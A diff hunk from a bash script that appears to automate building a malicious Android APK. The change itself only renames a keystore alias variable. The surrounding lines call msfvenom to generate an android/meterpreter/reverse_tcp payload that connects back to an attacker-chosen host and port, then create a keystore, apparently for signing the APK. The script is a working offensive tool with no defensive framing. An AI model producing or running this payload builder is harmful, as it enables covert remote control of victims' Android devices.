@@ -31,14 +31,14 @@ echo -en "Enter APK Name: "
 read name
 echo
 echo -en "Enter Alias for KeyStore : "
-read alias
+read als
 echo
 echo "=============================================="
 echo
 #printf "${STOP}"
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o $name.apk
  
-keytool -genkey -V -keystore key.keystore -alias $alias -keyalg RSA -keysize 2048 -validity 10000
+keytool -genkey -V -keystore key.keystore -alias $als -keyalg RSA -keysize 2048 -validity 10000
  
 #sudo apt-get install default-jdk -y
  
